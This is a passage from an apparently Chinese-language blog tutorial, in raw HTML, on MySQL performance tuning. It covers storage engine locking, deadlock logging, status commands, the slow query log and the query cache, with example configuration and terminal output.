(rw,noatime)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6837;&#x4EE5;&#x540E;&#x7CFB;&#x7EDF;&#x5728;&#x8BFB;&#x6B64;&#x5206;&#x533A;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x5C06;&#x4E0D;&#x4F1A;&#x518D;&#x4FEE;&#x6539;atime&#x5C5E;&#x6027;&#x3002;<br>&#x8BF4;&#x660E;&#xFF1A;&#x6D4B;&#x8BD5;&#x6548;&#x679C;&#xFF0C;&#x7ED3;&#x679C;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x7684;&#x610F;&#x4E49;&#x3002;</p><h3 id="5-MySQL-&#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;"><a href="#5-MySQL-&#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="5. MySQL &#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;)"></a>5. MySQL &#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;)</h3><p>&#x4FDD;&#x6301;&#x6BCF;&#x4E2A;&#x8868;&#x90FD;&#x4E0D;&#x8981;&#x592A;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x5927;&#x8868;&#x505A;&#x6A2A;&#x5207;&#x548C;&#x7EB5;&#x5207;&#xFF1A;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x8981;&#x53D6;&#x5F97;&#x67D0; ID &#x7684; lastlog&#xFF0C; &#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x5F20;&#x53EA;&#x6709;&#x201C;ID&#x548C; &#x201C;lastlog&#x201D;&#x7684;&#x5C0F;&#x8868;&#xFF0C;&#x800C;&#x975E;&#x51E0;&#x5341;&#x3001;&#x51E0;&#x767E;&#x5217;&#x6570;&#x636E;&#x7684;&#x5E76;&#x6392;&#x5927;;&#x53E6;&#x5916;&#x5BF9;&#x4E00;&#x4E2A;&#x6709; 1000 &#x4E07;&#x6761;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x6BD4;&#x5BF9; 10 &#x4E2A; 100 &#x4E07;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x4E00;&#x822C;&#x6765;&#x5F97;&#x8981;&#x6162;&#x3002;  </p><p><strong>&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A;</strong> </p><p>MyISAM &#x5F15;&#x64CE;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#x5F00;&#x9500;&#x5C0F;&#xFF0C;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5927;&#xFF0C;&#x9002;&#x5408;&#x8BFB;&#x591A;&#x5199;&#x5C11;&#x7684;&#x8868;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#xFF0C;&#x8868;&#x9501;&#x5B9A;&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x9501; &#xFF08;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#xFF09;  </p><p>Innodb &#x5F15;&#x64CE;&#xFF0C;&#x884C;&#x7EA7;&#x9501;&#xFF0C;&#x9501;&#x5B9A;&#x884C;&#x7684;&#x5F00;&#x9500;&#x8981;&#x6BD4;&#x9501;&#x5B9A;&#x5168;&#x8868;&#x8981;&#x5927;&#x3002;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5C0F;&#xFF0C;&#x9002;&#x5408;&#x5199;&#x64CD;&#x4F5C;&#x6BD4;&#x8F83;&#x9891;&#x7E41;&#x7684;&#x6570;&#x636E;&#x8868;&#x3002;&#x884C;&#x7EA7;&#x9501;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6B7B;&#x9501;  </p><p>MySQL&#x7684;&#x9501;&#x673A;&#x5236;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5176;&#x6700;&#x663E;&#x8457;&#x7684;&#x7279;&#x70B9;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x652F;&#x6301;&#x4E0D;&#x540C;&#x7684;&#x9501;&#x673A;&#x5236;  </p><p>&#x6240;&#x8C13;&#x6B7B;&#x9501;&#xFF1A;&#x662F;&#x6307;&#x4E24;&#x4E2A;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#x7684;&#x8FDB;&#x7A0B;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;,&#x56E0;&#x4E89;&#x593A;&#x8D44;&#x6E90;&#x800C;&#x9020;&#x6210;&#x7684;&#x4E00;&#x79CD;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x73B0;&#x8C61;,&#x82E5;&#x65E0;&#x5916;&#x529B;&#x4F5C;&#x7528;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x5C06;&#x65E0;&#x6CD5;&#x63A8;&#x8FDB;&#x4E0B;&#x53BB;&#xFF0C;&#x6B64;&#x65F6;&#x79F0;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x6B7B;&#x9501;&#x72B6;&#x6001;&#x6216;&#x7CFB;&#x7EDF;&#x4EA7;&#x751F;&#x4E86;&#x6B7B;&#x9501;&#xFF0C;&#x8FD9;&#x4E9B;&#x6C38;&#x8FDC;&#x5728;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x8FDB;&#x7A0B;&#x79F0;&#x4E3A;&#x6B7B;&#x9501;&#x8FDB;&#x7A0B;&#x3002;&#x8868;&#x7EA7;&#x9501;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x6B7B;&#x9501;&#xFF0C;&#x6240;&#x4EE5;&#x89E3;&#x51B3;&#x6B7B;&#x9501;&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x9488;&#x5BF9;&#x4E8E;&#x6700;&#x5E38;&#x7528;&#x7684;InnoDB  </p><p>&#x4E4B;&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x6B7B;&#x9501;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x8D44;&#x6E90;&#x7684;&#x5F3A;&#x5360;&#xFF0C;&#x4F60;&#x8981;&#x6211;&#x7684;&#xFF0C;&#x6211;&#x4E5F;&#x8981;&#x4F60;&#x7684;&#xFF0C;&#x4E24;&#x4EBA;&#x5835;&#x5728;&#x8DEF;&#x4E0A;&#x8C01;&#x90FD;&#x4E0D;&#x8BA9;&#xFF0C;&#x6240;&#x4EE5;&#x6B7B;&#x9501;&#x4E86;  </p><p>#&#x5F00;&#x542F;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x540E;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6B7B;&#x9501;&#x8BB0;&#x5F55;&#x5230;mysqld.log&#x4E2D; &#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5728;my.cnf&#x914D;&#x7F6E;&#x4E3A; </p><pre><code>log-error=/data/mysql/mysqld.loginnodb_print_all_deadlocks = 1innodb_sort_buffer_size = 16M</code></pre><p>&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x767B;&#x5F55;mysql<br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show status; #&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;</span><br><span class="line">mysql&gt; show engine innodb status \G #&#x663E;&#x793A; InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684;&#x72B6;&#x6001;</span><br><span class="line">mysql&gt; show variables; #&#x770B;&#x53D8;&#x91CF;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;&#xFF1A;<br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show warnings; #&#x67E5;&#x770B;&#x6700;&#x8FD1;&#x4E00;&#x4E2A; sql &#x8BED;&#x53E5;&#x4EA7;&#x751F;&#x7684;&#x9519;&#x8BEF;&#x8B66;&#x544A;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F8B;&#xFF1A;&#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; adadfs; -- &#x968F;&#x4FBF;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#xFF0C;&#x56DE;&#x8F66;&#xFF0C;&#x5C06;&#x770B;&#x5230;&#x4EE5;&#x4E0B;&#x4E00;&#x4E9B;&#x9519;&#x8BEF;&#x4FE1;&#x606F; </span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">&apos;adadfs&apos;</span> <span class="keyword">at</span> line <span class="number">1</span> </span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">warnings</span>; </span><br><span class="line">mysql&gt; show processlist ; -- &#x663E;&#x793A;mysql&#x7CFB;&#x7EDF;&#x4E2D;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4; </span><br><span class="line"><span class="comment">-- &#x672C;&#x8BED;&#x53E5;TCP/IP&#x8FDE;&#x63A5;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF08;&#x91C7;&#x7528;host_name:client_port&#x683C;&#x5F0F;&#xFF09;&#xFF0C;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x5224;&#x5B9A;&#x54EA;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x505A;&#x4EC0;&#x4E48;</span></span><br><span class="line">mysql&gt; show processlist ;</span><br><span class="line">+<span class="comment">----+------+-----------+------+---------+------+----------+------------------+</span></span><br><span class="line">| Id | User | Host&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | db&#xA0;&#xA0; | Command | Time | State&#xA0;&#xA0;&#xA0; | Info&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">----+------+-----------+------+---------+------+----------+------------------+</span></span><br><span class="line">|&#xA0; 4 | root | localhost | NULL | Query&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0; 0 | starting | <span class="keyword">show</span> <span class="keyword">processlist</span> |</span><br><span class="line">+<span class="comment">----+------+-----------+------+---------+------+----------+------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x542F;&#x7528; MySQL &#x6162;&#x67E5;&#x8BE2;&#xFF1A;&#x2014;&#x5206;&#x6790; sql &#x8BED;&#x53E5;&#xFF0C;&#x627E;&#x5230;&#x5F71;&#x54CD;&#x6548;&#x7387;&#x7684; SQL<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# vim /etc/my.cnf </span><br><span class="line">[mysqld] </span><br><span class="line">slow_query_log=1&#xA0; #&#x5F00;&#x542F;&#x6162;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;</span><br><span class="line">slow-query-log-file=/data/mysql/slow.log &#xA0;#mysql &#x7528;&#x6237;&#x5BF9;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650; </span><br><span class="line">long_query_time=5 &#xA0;#&#x67E5;&#x8BE2;&#x8D85;&#x8FC7; 5 &#x79D2;&#x949F;&#x7684;&#x8BED;&#x53E5;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;</span><br><span class="line">log-queries-not-using-indexes=1&#xA0; #&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E09;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x8BB0;&#x5F55;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;5 &#x79D2;&#x548C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;&#xFF1B;&#x8BF7;&#x6CE8;&#x610F;&#x6709;&#x5173;log-queries-not-using-indexes&#x7684;&#x8B66;&#x544A;&#xFF1B;&#x6162;&#x901F;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/data/mysql/slow.log<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.&#xA0; Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.19-log Source distribution</span><br><span class="line"> </span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"> </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"> </span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop database testdb;</span><br><span class="line">Query OK, 12 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; create database testdb;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; use testdb;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table test (id int,name varchar(20));</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; insert into test values (1,&apos;man&apos;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">| id&#xA0;&#xA0; | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">|&#xA0;&#xA0;&#xA0; 1 | man&#xA0; |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x67E5;&#x770B;slow.log</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# tail -f /data/mysql/slow.log </span><br><span class="line">/usr/local/mysql57/bin/mysqld, Version: 5.7.19-log (Source distribution). started with:</span><br><span class="line">Tcp port: 3306&#xA0; Unix socket: /data/mysql/mysql.sock</span><br><span class="line">Time&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Id Command&#xA0;&#xA0;&#xA0; Argument</span><br><span class="line"><span class="meta">#</span><span class="bash"> Time: 2021-05-15T11:36:01.644259Z</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> User@Host: root[root] @ localhost []&#xA0; Id:&#xA0;&#xA0;&#xA0;&#xA0; 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Query_time: 0.000150&#xA0; Lock_time: 0.000062 Rows_sent: 1&#xA0; Rows_examined: 1</span></span><br><span class="line">use testdb;</span><br><span class="line">SET timestamp=1621078561;</span><br><span class="line">select * from test;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="6-my-cnf-&#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;"><a href="#6-my-cnf-&#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="6. my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;"></a>6. my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;</h3><p><strong>&#x4F18;&#x5316;&#x603B;&#x539F;&#x5219;&#xFF1A;</strong><br>&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x5C11;&#xFF0C;&#x5219; mysql &#x65BD;&#x5C55;&#x4E0D;&#x5F00;&#xFF1A;&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x591A;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x62D6;&#x7D2F;&#x6574;&#x4E2A; OS 40%&#x8D44;&#x6E90;&#x7ED9;OS&#xFF0C; 60%-70% &#x7ED9;mysql &#xFF08;&#x5185;&#x5B58;&#x548C;CPU&#xFF09;  </p><p><strong>&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x7F13;&#x5B58;</strong><br>&#x5927;&#x591A;&#x6570;LAMP&#x5E94;&#x7528;&#x90FD;&#x4E25;&#x91CD;&#x4F9D;&#x8D56;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#xFF0C;&#x67E5;&#x8BE2;&#x7684;&#x5927;&#x81F4;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;:<br>PHP&#x53D1;&#x51FA;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;-&gt;&#x6570;&#x636E;&#x5E93;&#x6536;&#x5230;&#x6307;&#x4EE4;&#x5BF9;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x5206;&#x6790;-&gt;&#x786E;&#x5B9A;&#x5982;&#x4F55;&#x67E5;&#x8BE2;-&gt;&#x4ECE;&#x78C1;&#x76D8;&#x4E2D;&#x52A0;&#x8F7D;&#x4FE1;&#x606F;-&gt;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;<br>&#x5982;&#x679C;&#x53CD;&#x590D;&#x67E5;&#x8BE2;&#xFF0C;&#x5C31;&#x53CD;&#x590D;&#x6267;&#x884C;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#xFF1B;MySQL &#x6709;&#x4E00;&#x4E2A;&#x7279;&#x6027;&#x79F0;&#x4E3A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4F1A;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x95EE;&#x9898;&#x662F;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7981;&#x7528;&#x7684;&#x3002;  </p><p><strong>&#x542F;&#x52A8;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF1A;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf &#x6DFB;&#x52A0;&#xFF1A; </span><br><span class="line">[mysqld] #&#x5728;&#x6B64;&#x5B57;&#x6BB5;&#x4E2D;&#x6DFB;&#x52A0; </span><br><span class="line">query_cache_size = 32M</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;&#xFF1A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.&#xA0; Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.19-log Source distribution</span><br><span class="line"> </span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"> </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"> </span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show status like &apos;qcache%&apos;;</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33537320 |</span><br><span class="line">| Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_lowmem_prunes&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_not_cached&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_queries_in_cache | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| Qcache_total_blocks&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------------------+----------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x89E3;&#x91CA;&#x5982;&#x4E0B;&#xFF1A; </p><table><thead><tr><th>&#x53D8;&#x91CF;&#x540D;</th><th>&#x8BF4;&#x660E;</th><th>&#x5907;&#x6CE8;</th></tr></thead><tbody><tr><td>Qcache_free_blocks</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x76F8;&#x90BB;&#x5185;&#x5B58;&#x5757;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x6570;&#x76EE;&#x5927;&#x8BF4;&#x660E;&#x53EF;&#x80FD;&#x6709;&#x788E;&#x7247;</td><td>&#x5982;&#x679C;&#x6570;&#x76EE;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;<code>flush query cache;</code>&#x5BF9;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x6574;&#x7406;&#xFF0C;&#x4ECE;&#x800C;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x5757;</td></tr><tr><td>Qcache_free_memory</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5927;&#x5C0F;</td></tr><tr><td>Qcache_hits</td><td>&#x6BCF;&#x6B21;&#x67E5;&#x8BE2;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x547D;&#x4E2D;&#x65F6;&#x5C31;&#x589E;&#x5927;</td></tr><tr><td>Qcache_inserts</td><td>&#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x65F6;&#x5C31;&#x589E;&#x5927;&#xFF0C;&#x5373;&#x6CA1;&#x6709;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x627E;&#x5230;&#x6570;&#x636E;</td></tr><tr><td>Qcache_lowmem_prunes</td><td>&#x56E0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5220;&#x9664;&#x7F13;&#x5B58;&#x6B21;&#x6570;&#xFF0C;&#x7F13;&#x5B58;&#x51FA;&#x73B0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5E76;&#x4E14;&#x5FC5;&#x987B;&#x8981;&#x8FDB;&#x884C;&#x6E05;&#x7406;,&#x4EE5;&#x4FBF;&#x4E3A;&#x66F4;&#x591A;&#x67E5;&#x8BE2;&#x63D0;&#x4F9B;&#x7A7A;&#x95F4;&#x7684;&#x6B21;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x6700;&#x597D;&#x957F;&#x65F6;&#x95F4;&#x6765;&#x770B;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x5728;&#x4E0D;&#x65AD;&#x589E;&#x957F;&#xFF0C;&#x5C31;&#x8868;&#x793A;&#x53EF;&#x80FD;&#x788E;&#x7247;&#x975E;&#x5E38;&#x4E25;&#x91CD;&#xFF0C;&#x6216;&#x8005;&#x7F13;&#x5B58;&#x5185;&#x5B58;&#x5F88;&#x5C11;  